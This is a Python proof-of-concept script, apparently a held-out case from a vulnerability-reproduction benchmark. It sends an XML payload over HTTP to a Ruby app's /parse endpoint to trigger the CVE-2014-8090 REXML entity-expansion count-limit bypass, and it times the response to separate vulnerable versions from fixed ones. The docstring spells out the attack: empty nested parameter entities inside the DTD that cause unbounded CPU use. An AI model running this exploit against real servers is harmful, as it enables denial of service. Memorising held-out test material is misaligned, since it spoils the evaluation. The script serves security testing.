#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2014-8090 residual exploit, delivered over EXTERNAL HTTP.

POSTs the CVE-2014-8090 residual (payloads/residual_attack.xml) to the REAL Ruby web app (POST
/parse), parsed by the REAL bundled REXML of that MRI version. The residual is the entity-expansion
COUNT-limit bypass that CVE-2014-8080's per-value byte cap does NOT close: EMPTY nested parameter
entities a0..a30 (+ %trigger) referenced INSIDE the internal DTD subset. Every expansion yields ""
so the byte cap never trips (sum stays 0), but the NUMBER of expansions is 2**depth; during DTD
parsing the Document has no root element, so Document#document == nil on V0/V1 and
record_entity_expansion (the count limit) is never invoked -> UNBOUNDED CPU -> server-side DoS.
CVE-2014-8090 (ruby 2.1.5, V2) adds Document#document => self, so the count limit fires at 10000
and raises "number of entity expansions exceeded, processing aborted." -> FAST/limited.

Expected: SLOW (hang) on V1 (INCOMPLETE fix); FAST (limited) on V2.

Usage: bypass_poc.py http://127.0.0.1:28221
"""
import http.client
import json
import os
import socket
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
CASE = os.path.dirname(HERE)
HTTP_TIMEOUT_S = 10.0


def load_payload():
    with open(os.path.join(CASE, "payloads", "residual_attack.xml"), "rb") as f:
        return f.read()


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = load_payload()
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=body,
                  headers={"Content-Type": "application/xml", "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "crash": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "crash": False, "resp": None}
    except (http.client.RemoteDisconnected, ConnectionResetError, ConnectionRefusedError, OSError) as e:
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "crash": True,
                "resp": None, "error": str(e)}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28221"
    out = run(base)
    out["poc"] = "residual/CVE-2014-8090"
    out["payload_bytes"] = len(load_payload())
    out["target"] = base
    print(json.dumps(out, indent=2))
